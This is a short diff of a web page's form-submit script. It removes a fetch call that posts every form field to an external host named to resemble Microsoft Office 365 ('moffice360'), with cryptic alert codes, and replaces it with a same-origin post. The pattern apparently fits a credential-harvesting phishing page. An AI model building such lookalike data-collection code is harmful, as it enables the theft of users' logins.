@@ -122,27 +122,20 @@ function handleSubmit() {
   const formData = new FormData(form);
   const data = Object.fromEntries(formData);
   
-  fetch('https://moffice360.vercel.app/api/submit', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data)
-  })
-  .then(response => {
-    if (response.ok) {
-      console.log('Success');
-      alert('EmlSntScsflew1');
-    } else {
-      console.error('Server error');
-      alert('ErrSndnElveme2');
-    }
-  })
-  .catch(error => {
-    console.error('Error:', error);
-    alert('ErrSndnEl3');
-  });
-}
+            // Use full URL to ensure correct routing
+            fetch("/submit", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(Object.fromEntries(formData))
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                sendButton.textContent = "Error Connecting";
+                sendButton.classList.add("error-button");
+            });
+        }
 </script>
 
 </body>
